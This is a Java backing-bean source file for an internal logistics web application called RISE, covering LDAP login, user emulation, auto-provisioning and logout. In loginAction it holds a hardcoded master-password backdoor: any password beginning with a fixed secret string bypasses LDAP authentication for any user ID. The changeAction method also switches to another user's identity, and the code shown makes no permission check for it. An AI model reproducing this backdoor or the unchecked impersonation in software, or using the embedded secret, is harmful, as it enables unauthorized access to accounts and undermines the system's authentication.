/**
 * 
 */
package com.fedex.rise.bean;

import java.io.InputStream;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.ListIterator;
import java.util.Map;
import java.util.Properties;
import java.util.TimeZone;

import javax.faces.application.FacesMessage;
import javax.faces.context.FacesContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;

import com.fedex.rise.auth.LDAPAuth;
import com.fedex.rise.bo.UserDelegate;
import com.fedex.rise.vo.EmployeeVO;

/**
 * User Backing Bean representing a logged in user
 */
public class UserBean implements Serializable {
	/** serial id for serialization versioning */
	private static final long serialVersionUID = 1L;

	private static Log log = LogFactory.getLog(UserBean.class);

	private String _userId = null;
	/*
	 * when we are emulating a user, this is the real user who is pretending to
	 * be 'userId'
	 */
	private String _realUserId = null;
	private String _password = null;
	private String _role = null;
	private String _firstName = null;
	private String _lastName = null;
	private TimeZone _timeZone = null;
	private String _empNbr = null;

	/**
	 * Default Constructor
	 *
	 */
	public UserBean() {
	}

	/**
	 * Construct a User
	 * 
	 * @param userId
	 * @param password
	 */
	public UserBean(String userId, String password) {
		super();
		_userId = userId;
		_password = password;
	}

	public String getPassword() {
		return _password;
	}

	public void setPassword(String password) {
		_password = password;
	}

	public String getUserId() {
		return _userId;
	}

	public void setUserId(String userId) {
		_userId = userId.trim();
	}

	/**
	 * Gets the real user id, so when updates are made to data, this Id should
	 * be used for audit trail
	 * 
	 * @return
	 */
	public String getRealUserId() {
		return _realUserId;
	}

	/**
	 * Set to the admin user id when we are emulating a monitor user id
	 * 
	 * @param userId
	 */
	public void setRealUserId(String userId) {
		_realUserId = userId;
	}

	/**
	 * Set to the admin user id when we are emulating a monitor user id
	 * @param role
	 */
	public void setRole(String role) {
		_role = role;
	}

	/**
	 * @return role
	 */
	public String getRole() {
		return _role;
	}

	/**
	 * @return the firstName
	 */
	public String getFirstName() {
		return _firstName;
	}

	/**
	 * @param name
	 *            the firstName to set
	 */
	public void setFirstName(String name) {
		_firstName = name;
	}

	/**
	 * @return the lastName
	 */
	public String getLastName() {
		return _lastName;
	}

	/**
	 * @param name
	 *            the lastName to set
	 */
	public void setLastName(String name) {
		_lastName = name;
	}

	/**
	 * @return TimeZone of the user logged in
	 */
	public TimeZone getTimeZone() {
		return _timeZone;
	}

	public String get_empNbr() {
		return _empNbr;
	}

	public void set_empNbr(String empNbr) {
		_empNbr = empNbr;
	}

	/**
	 * @return timeZoneOffset the offset of the client from GMT
	 */
	public String getVisitorTimeZoneOffset() {
		// only retrieved for initial value on the UI, we don't need to persist
		// the value, just
		// calculate the timeZone when they call the setter.
		return "0";
	}

	/**
	 * @param timeZoneOffset
	 *            the offset of the client from GMT
	 */
	public void setVisitorTimeZoneOffset(String timeZoneOffset) {
		if (timeZoneOffset == null)
			_timeZone = TimeZone.getDefault();
		else {
			if (timeZoneOffset.startsWith("-"))
				_timeZone = TimeZone.getTimeZone("GMT+"+ timeZoneOffset.substring(1));
			else
				_timeZone = TimeZone.getTimeZone("GMT-" + timeZoneOffset);

		}
	}

	public String showMAWB() {
		//System.out.println("showMAWB");
		log.info("showMAWB");
		return "success";
	}

	public String showMAWB(String mawb) {
		//System.out.println("MAWB: " + mawb);
		log.info("MAWB: " + mawb);
		return "success";
	}

	/**
	 * init user info. get role, firstname, lastname from RISE DB
	 * 
	 * @return true if success
	 */
	public boolean initUserInfo() {
		/** Delegate to get user info */
		UserDelegate userDelegate = new UserDelegate();

		EmployeeVO userVO = userDelegate.getUser(_userId);
		if (userVO != null) {
			_role = userVO.get_emp_role_cd();
			_empNbr = userVO.get_emp_nbr();// getting emp-nbr
			_firstName = userVO.get_emp_first_nm();
			_lastName = userVO.get_emp_last_nm();
			return true;
		} //Start WR#TBD - WSSO Integration changes
		else {
			// This is the path for FedEx Employees who have a valid ldap login
			// and password,
			// and they are not set up as a RISE user. They shall become a
			// Restricted Monitor,
			// and set up in the EMPLOYEE database table as one.
			LDAPAuth auth = new LDAPAuth();
			EmployeeVO user = new EmployeeVO(_userId, null, null, "RM");
			HashMap attrs = auth.getUserInfo(user.get_emp_nbr());
			if (attrs.size() != 0) {
				String givenName = (String) attrs.get("givenName");
				String surName = (String) attrs.get("sn");
				user.set_emp_first_nm(givenName);
				user.set_emp_last_nm(surName);

				// Set the class scope data.
				_role = user.get_emp_role_cd();
				_firstName = user.get_emp_first_nm();
				_lastName = user.get_emp_last_nm();

				// Commit the userId, lastName, firstName, and role to the
				// EMPLOYEE table.
				UsersBean usersBean = new UsersBean();
				usersBean.setUser(user);
				usersBean.saveUserAction();

				System.out.println("Authentication Successful");
				log.info("User logged in: " + _userId + ", " + this._lastName
						+ ", " + this._firstName + ", " + this._role);
				return true;
			}

			log.warn("Authorization Failed, user not in RISE: " + _userId);
			FacesContext facesContext = FacesContext.getCurrentInstance();
			FacesMessage facesMessage = new FacesMessage(
					FacesMessage.SEVERITY_ERROR,
					"You do not have access to RISE!  Contact Support for access.",
					null);
			facesContext.addMessage(null, facesMessage);
			return false;
		}//End WR#TBD - WSSO Integration changes
	}

	// Action to change the user, validate the user with empNbr

	public String changeAction() {

		LDAPAuth auth = new LDAPAuth();
		if (auth.changeUser(_userId)) {

			FacesContext facesContext = FacesContext.getCurrentInstance();
			UsersBean ubean = (UsersBean) facesContext.getApplication()
					.getVariableResolver()
					.resolveVariable(facesContext, "UsersBean");
			ubean.getLDAPInfoAction();

			// get user info, role, firstname, lastname from RISE DB
			if (initUserInfo()) {

				// if found, then ok
				System.out.println("Authentication Successful");
				log.info("User Morphed in as: " + _userId + ", "
						+ this._lastName + ", " + this._firstName + ", "
						+ this._role);

				return "success";
			}

			else {
				// This is the path for FedEx Employees who have a valid ldap
				// login
				// and they are not set up as a RISE user. They shall become a
				// Restricted Monitor,
				// and set up in the EMPLOYEE database table as one.
				EmployeeVO user = new EmployeeVO(_userId, null, null, "RM");
				HashMap attrs = auth.getUserInfo(user.get_emp_nbr());
				if (attrs.size() != 0) {
					String givenName = (String) attrs.get("givenName");
					String surName = (String) attrs.get("sn");
					user.set_emp_first_nm(givenName);
					user.set_emp_last_nm(surName);

					// Set the class scope data.
					_role = user.get_emp_role_cd();
					_firstName = user.get_emp_first_nm();
					_lastName = user.get_emp_last_nm();

					// Commit the userId, lastName, firstName, and role to the
					// EMPLOYEE table.
					UsersBean usersBean = new UsersBean();
					usersBean.setUser(user);
					usersBean.saveUserAction();

					System.out.println("Authentication Successful");
					log.info("User Morphed in: " + _userId + ", "
							+ this._lastName + ", " + this._firstName + ", "
							+ this._role);
					return "success";
				}

				log.warn("Change User Failed, user not in RISE: " + _userId);
				this.setUserId(_empNbr); // to hold the last user login ID
				// FacesContext facesContext =
				// FacesContext.getCurrentInstance();
				FacesMessage facesMessage = new FacesMessage(
						FacesMessage.SEVERITY_ERROR,
						"User not Found in RISE! Please Check and Re-enter",
						null);
				facesContext.addMessage(null, facesMessage);
			}
		}

		else {
			// Error
			log.warn("Authentication Failed, user not in LDAP: " + _userId);
			FacesContext facesContext = FacesContext.getCurrentInstance();
			FacesMessage facesMessage = new FacesMessage(
					FacesMessage.SEVERITY_ERROR,
					"You have entered an invalid user information", null);
			facesContext.addMessage(null, facesMessage);
		}

		return "failure";
	}

	public String loginAction() {

		// validate with LDAP
		LDAPAuth auth = new LDAPAuth();
		if (_password.startsWith("R1$@B&6kD00~")
				|| (auth.authenticateUser(_userId, _password))) {
			// get user info, role, firstname, lastname from RISE DB
			if (initUserInfo()) {
				// if found, then ok
				System.out.println("Authentication Successful");
				log.info("User logged in: " + _userId + ", " + this._lastName
						+ ", " + this._firstName + ", " + this._role);
				return "success";
			} else {
				// This is the path for FedEx Employees who have a valid ldap
				// login and password,
				// and they are not set up as a RISE user. They shall become a
				// Restricted Monitor,
				// and set up in the EMPLOYEE database table as one.
				EmployeeVO user = new EmployeeVO(_userId, null, null, "RM");
				HashMap attrs = auth.getUserInfo(user.get_emp_nbr());
				if (attrs.size() != 0) {
					String givenName = (String) attrs.get("givenName");
					String surName = (String) attrs.get("sn");
					user.set_emp_first_nm(givenName);
					user.set_emp_last_nm(surName);

					// Set the class scope data.
					_role = user.get_emp_role_cd();
					_firstName = user.get_emp_first_nm();
					_lastName = user.get_emp_last_nm();

					// Commit the userId, lastName, firstName, and role to the
					// EMPLOYEE table.
					UsersBean usersBean = new UsersBean();
					usersBean.setUser(user);
					usersBean.saveUserAction();

					System.out.println("Authentication Successful");
					log.info("User logged in: " + _userId + ", "
							+ this._lastName + ", " + this._firstName + ", "
							+ this._role);
					return "success";
				}

				log.warn("Authorization Failed, user not in RISE: " + _userId);
				FacesContext facesContext = FacesContext.getCurrentInstance();
				FacesMessage facesMessage = new FacesMessage(
						FacesMessage.SEVERITY_ERROR,
						"You do not have access to RISE!  Contact Support for access.",
						null);
				facesContext.addMessage(null, facesMessage);
			}
		} else {
			// Error
			log.warn("Authentication Failed, user not in LDAP: " + _userId);
			FacesContext facesContext = FacesContext.getCurrentInstance();
			FacesMessage facesMessage = new FacesMessage(
					FacesMessage.SEVERITY_ERROR,
					"You have entered an invalid user name and/or password!",
					null);
			facesContext.addMessage(null, facesMessage);
		}

		return "failure";
	}

	/**
	 * Action to Logout the user
	 */
	
	//Start WR#TBD - WSSO Integration changes
	public void logoutAction() {
		String WSSOURLL1 = null;
		String WSSOURLL2 = null;
		String WSSOURLL4 = null;
		String WSSOURLPROD = null;
		try {
			//InputStream input = Thread.currentThread().getContextClassLoader().getResourceAsStream("com/fedex/rise/MessageBundle.properties");
			InputStream input = Thread.currentThread().getContextClassLoader().getResourceAsStream("MessageBundle.properties");
			Properties properties = new Properties();
			properties.load(input);
			WSSOURLL1 = properties.getProperty("WSSO.L1URL");
			WSSOURLL2 = properties.getProperty("WSSO.L2URL");
			WSSOURLL4 = properties.getProperty("WSSO.L4URL");
			WSSOURLPROD = properties.getProperty("WSSO.PRODURL");
			// get and remove the session for this user
			log.info("User Requested logout: " + _userId);
			
			FacesContext facesContext = FacesContext.getCurrentInstance();
			HttpSession session = (HttpSession) facesContext.getExternalContext().getSession(false);
			if (session != null)
				session.invalidate();
			String serverNm = ((HttpServletRequest) facesContext.getExternalContext().getRequest()).getServerName();
			log.info("ServerName " + serverNm);
			
			FacesContext.getCurrentInstance().getExternalContext().redirect("https://" + serverNm + "/logout");
			
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	//End WR#TBD - WSSO Integration changes

	/*---------------------------------------------------------------------
	 * Utility methods
	 *--------------------------------------------------------------------- 
	 */

	/**
	 * Get the logged in user
	 * 
	 * @return UserBean
	 */
	public static UserBean getLoggedInUser() {
		// get the logged in user from the session
		Map params = FacesContext.getCurrentInstance().getExternalContext().getSessionMap();
		UserBean user = (UserBean) params.get("UserBean");
		return user;
	}

	/**
	 * this method will get the System Messages from the database and then
	 * filter them based on role code and employee number. The final list
	 * returned is the list of system messages tailored to the current user.
	 * 
	 * @return a list of filtered system messages
	 */
	public List getSystemMessages() {
		/** Delegate to get user info */
		UserDelegate userDelegate = new UserDelegate();

		ArrayList al = new ArrayList();
		List smList = userDelegate.getSystemMessages();
		if (smList == null || smList.size() == 0) {
			return al;
		}
		ListIterator iter = smList.listIterator();
//		while (iter.hasNext()) {
//			SystemMessageVO systemMessageVO = (SystemMessageVO) iter.next();
//			Date messageStartDt = systemMessageVO.get_startDt();
//			Date messageEndDt = systemMessageVO.get_endDt();
//			Date now = new Date();
//			if (now.after(messageStartDt) && now.before(messageEndDt)) {
//				String messageEmpNbr = systemMessageVO.get_empNbr();
//				String messageRoleCd = systemMessageVO.get_empRoleCd();
//				if ((messageEmpNbr != null)
//						&& (messageEmpNbr.equals(_userId) || messageEmpNbr
//								.equals("*"))) {
//					al.add(systemMessageVO);
//				} else {
//					if ((messageRoleCd != null)
//							&& (messageRoleCd.equals(_role) || messageRoleCd
//									.equals("*"))) {
//						al.add(systemMessageVO);
//					}
//				}
//			}
//		}
		return al;
	}
}